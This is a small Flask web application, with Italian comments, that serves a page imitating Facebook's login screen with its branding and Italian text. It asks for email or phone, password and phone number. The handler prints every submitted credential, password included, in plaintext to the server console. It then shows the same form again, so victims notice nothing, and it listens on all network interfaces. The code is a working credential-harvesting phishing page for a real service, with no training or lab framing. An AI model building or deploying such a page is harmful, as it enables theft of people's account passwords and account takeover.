from flask import Flask, request, render_template_string

app = Flask(__name__)

# HTML template per la pagina di registrazione simile a Facebook
facebook_login_template = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Accedi o registrati</title>
    <style>
        /* Reset CSS per lo stile di base */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        /* Stili globali */
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
        }

        .container {
            max-width: 600px;
            margin: 20px auto;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            padding: 20px;
        }

        header {
            background-color: #3b5998;
            color: #fff;
            padding: 10px 20px;
            text-align: center;
            border-top-left-radius: 8px;
            border-top-right-radius: 8px;
        }

        header h1 {
            font-size: 24px;
            margin: 0;
        }

        main {
            padding: 20px;
        }

        .form-container {
            background-color: #f9f9f9;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            margin-top: 20px;
        }

        input[type="text"],
        input[type="email"],
        input[type="password"] {
            width: calc(100% - 20px);
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }

        input[type="submit"] {
            width: 100%;
            background-color: #1877f2;
            color: white;
            padding: 12px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }

        input[type="submit"]:hover {
            background-color: #0e5a9b;
        }

        .links {
            text-align: center;
            margin-top: 10px;
        }

        .links a {
            text-decoration: none;
            color: #1877f2;
            margin: 0 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>Facebook</h1>
        </header>

        <main>
            <p>Facebook ti aiuta a connetterti e rimanere in contatto con le persone della tua vita.</p>
            
            {% if registration_success %}
            <div style="text-align: center; margin-bottom: 20px;">
                <h2>Registrazione completata!</h2>
                <p>Email: {{ email }}</p>
                <p>Phone Number: {{ phone }}</p>
            </div>
            {% else %}
            <div class="form-container">
                <form action="/" method="POST">
                    <label for="email">E-mail o numero di telefono:</label><br>
                    <input type="text" id="email" name="email" required><br><br>
                    <label for="password">Password:</label><br>
                    <input type="password" id="password" name="password" required><br><br>
                    <label for="phone">Phone Number:</label><br>
                    <input type="text" id="phone" name="phone" required><br><br>
                    <input type="submit" value="Accedi">
                </form>
                <p><a href="#">Password dimenticata?</a></p>
            </div>

            <div class="links">
                <a href="#">Crea nuovo account</a> ·
                <a href="#">Crea una Pagina per un personaggio famoso, un brand o un'azienda.</a>
            </div>
            {% endif %}
        </main>

        <footer>
            <p><a href="#">Italiano</a> ·
            <a href="#">Deutsch</a> ·
            <a href="#">English (US)</a> ·
            <a href="#">Türkçe</a> ·
            <a href="#">Polski</a> ·
            <a href="#">Română</a> ·
            <a href="#">Français (France)</a> ·
            <a href="#">Русский</a> ·
            <a href="#">العربية</a> ·
            <a href="#">Español</a> ·
            <a href="#">Português (Brasil)</a></p>
        </footer>
    </div>
</body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        phone = request.form['phone']
        # Simulazione registrazione (rimuovere in produzione)
        print(f"Registrazione completata per {email}")
        print(f"Email: {email}, Password: {password}, Phone Number: {phone}")
        return render_template_string(facebook_login_template, registration_success=False)

    return render_template_string(facebook_login_template, registration_success=False)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)